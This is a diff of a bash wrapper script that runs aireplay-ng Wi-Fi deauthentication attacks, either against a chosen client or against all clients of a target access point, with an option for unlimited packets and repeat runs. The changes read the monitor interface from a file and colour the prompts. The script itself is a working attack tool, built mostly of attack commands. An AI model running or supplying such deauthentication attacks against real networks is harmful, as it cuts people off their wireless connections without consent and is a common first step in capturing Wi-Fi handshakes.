@@ -1,6 +1,8 @@
 #! /bin/bash
 k=1
 REDEAUTH="n"
+WLANNM=$(cat /root/lscript/wlanmon.txt)
+export WLANNM
 while (( $k != 0 ))
 do
 if [ "$REDEAUTH" = "y" ]
@@ -9,7 +11,7 @@ then
 	xterm -e bash -c 'aireplay-ng $LASTOPTIONS && exit; exec bash'
 	#aireplay-ng $LASTOPTIONS
 else
-	echo -e "Do you want to deauth a specific client?(y/n)(Enter=no): "	
+	echo -e "Do you want to deauth a specific client?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=no): "	
 	read -e OPTION
 	if [ "$OPTION" = "y" ]
 	then
@@ -22,11 +24,11 @@ else
 		then
 			DEAUTHS=0
 		fi
-		LASTOPTIONS="-0 $DEAUTHS -a $TARGB -c $TCC wlan0mon"
+		LASTOPTIONS="-0 $DEAUTHS -a $TARGB -c $TCC $WLANNM"
 		export DEAUTHS
 		export TARGB
 		export TCC
-		xterm -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC wlan0mon && exit; exec bash'
+		xterm -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash'
 		#aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC wlan0mon
 		#sleep 1h
 	else
@@ -36,20 +38,20 @@ else
 		then
 			DEAUTHS=0
 		fi
-		LASTOPTIONS="-0 $DEAUTHS -a $TARGB wlan0mon"
+		LASTOPTIONS="-0 $DEAUTHS -a $TARGB $WLANNM"
 		export DEAUTHS
 		export TARGB
-		xterm -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB wlan0mon && exit; exec bash'
-		#aireplay-ng -0 $DEAUTHS -a $TARGB wlan0mon
+		xterm -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash'
+		#aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM
 		#sleep 1h
 	fi
 fi
 #----------------------------------------------------------------------------------------------------------------------------------
-echo -e "Re-deauth with the same exact settings?(y/n)(Enter=yes)(0=Exit): "
+echo -e "Re-deauth with the same exact settings?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=yes)(0=Exit): "
 read -e REDEAUTH
 if [ "$REDEAUTH" = "n" ]
 then
-	echo -e "Exit completely?(y/n)(Enter=no): "
+	echo -e "Exit completely?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=no): "
 	read -e EXIT
 	if [ "$EXIT" = "y" ]
 	then
@@ -67,7 +69,7 @@ else
 	#aireplay-ng $LASTOPTIONS
 fi
 done
-echo -e "Sure? (y/n)(Enter=no): "
+echo -e "Sure?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=no): "
 read -e BB
 if [ "$BB" = "y" ]
 then
